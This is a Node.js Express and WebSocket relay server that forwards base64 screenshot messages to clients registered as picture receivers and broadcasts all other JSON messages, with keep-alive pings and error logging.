const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();  
    ws.on("message", data => {
        try {
            handleMessage(ws, data, userID);
        } catch (error) {
            console.error('Error handling message:', error);
            safeWSsend(ws, JSON.stringify({ error: 'Internal server error' }));
        }
    });

    ws.on("close", () => {
        try {
            handleDisconnect(userID);
        } catch (error) {
            console.error('Error handling disconnect:', error);
        }
        ws.removeAllListeners(); 
    });

    ws.on("error", (error) => {
        console.error('WebSocket error:', error);
        try {
            handleDisconnect(userID);
        } catch (innerError) {
            console.error('Error during error handling:', innerError);
        }
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleMessage(ws, data, userID) {
    let messageData;
    try {
        messageData = JSON.parse(data);
    } catch (e) {
        console.error('Error parsing message data:', e);
        safeWSsend(ws, JSON.stringify({ error: 'Invalid message format' }));
        return;
    }

    try {
        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        console.error('Error processing message:', e);
        safeWSsend(ws, JSON.stringify({ error: 'Error processing message' }));
    }
}

function broadcastToPictureReceivers(message) {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        safeWSsend(ws, data);
    });
}

function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && (includeSelf || client !== senderWs)) {
            safeWSsend(client, message);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(null, false, (err) => {
                    if (err) console.error('Ping error:', err);
                }); 
            }
        });
    }, 30000);
}

function safeWSsend(ws, data) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(data, (error) => {
            if (error) console.error("WebSocket send error:", error);
        });
    }
}

// Xử lý lỗi không bắt được
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
